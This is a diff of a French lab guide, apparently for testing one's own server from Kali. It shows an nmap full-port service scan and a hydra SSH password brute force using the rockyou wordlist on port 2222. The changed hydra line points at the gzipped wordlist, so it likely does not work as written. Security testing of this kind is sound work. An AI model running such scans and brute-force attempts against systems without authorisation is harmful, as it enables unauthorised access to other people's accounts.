@@ -110,12 +110,12 @@ ssh -p 2222 ton_user@adresse_ip_serveur
 
 1. Depuis Kali, fais un scan de reconnaissance :
 ```bash
-nmap -p- -sV adresse_ip_serveur
+nmap -p- -sV <IP_SERVER>
 ```
 
 2. Port SSH : essaye un bruteforce avec hydra sur le port 2222 :
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<IP_SERVER> -s 2222
+hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz ssh://<IP_SERVER> -s 2222
 ```
 
 3. Lance un scan de vulnérabilités (reconnaissance passive) :
